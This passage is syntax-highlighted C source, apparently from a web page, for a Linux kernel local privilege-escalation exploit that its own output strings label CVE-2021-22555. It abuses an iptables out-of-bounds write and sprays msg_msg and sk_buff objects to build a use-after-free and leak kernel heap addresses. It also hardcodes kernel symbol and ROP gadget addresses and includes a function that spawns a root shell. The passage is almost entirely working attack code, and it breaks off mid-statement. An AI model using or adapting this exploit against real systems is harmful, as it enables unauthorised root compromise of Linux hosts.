class="line">519</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> socket_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span></span><br><span class="line">        <span class="type">char</span> pad[<span class="number">0x108</span> + PRIMARY_MSG_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span></span><br><span class="line">    &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">    data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">    data.replace.size = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    </span><br><span class="line">    data.entry.next_offset = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    data.entry.target_offset = </span><br><span class="line">            <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    </span><br><span class="line">    data.match.u.user.match_size = <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">    data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">    data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// partial overwrite the next object</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)))</span><br><span class="line">        <span class="keyword">if</span> (errno == ENOPROTOOPT)</span><br><span class="line">            errExit(<span class="string">&quot;ip_tables module is not loaded!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         socket_fd;</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ident namespace</span></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create socket!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(socket_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg 